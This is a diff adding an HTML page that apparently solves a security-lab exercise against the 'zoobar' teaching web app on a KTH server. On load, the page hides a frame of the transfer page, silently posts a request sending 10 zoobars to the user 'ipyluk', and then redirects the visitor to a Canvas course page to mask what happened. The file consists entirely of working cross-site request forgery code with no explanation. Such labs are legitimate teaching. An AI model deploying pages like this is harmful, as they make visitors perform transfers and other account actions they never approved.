@@ -1,0 +1,40 @@
+<!DOCtype html>
+<html>
+<head>
+	<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+	<script type="text/javascript">
+
+	window.onload = function() 
+	{
+		var frameset = document.createElement('frameset');
+		var frame1 = document.createElement('frame');
+		frame1.setAttribute('src','http://dasak.csc.kth.se/zoobar/transfer.php');
+		frameset.appendChild(frame1);
+
+		document.body.appendChild(frameset);
+		frameset.style.visibility = "hidden";
+
+		$.ajax({
+			url: 'http://dasak.csc.kth.se/zoobar/transfer.php',
+			type: 'post',
+			data: {
+				zoobars: '10',   
+				recipient: 'ipyluk',
+				submission:'Send'
+			},
+			dataType: 'json',
+			success: function (data) {
+				console.log(data);
+			}
+		});
+		location.href = "https://kth.instructure.com/courses/490";
+	};
+
+	</script>
+</head>
+<body>
+	
+
+</body>
+
+</html>
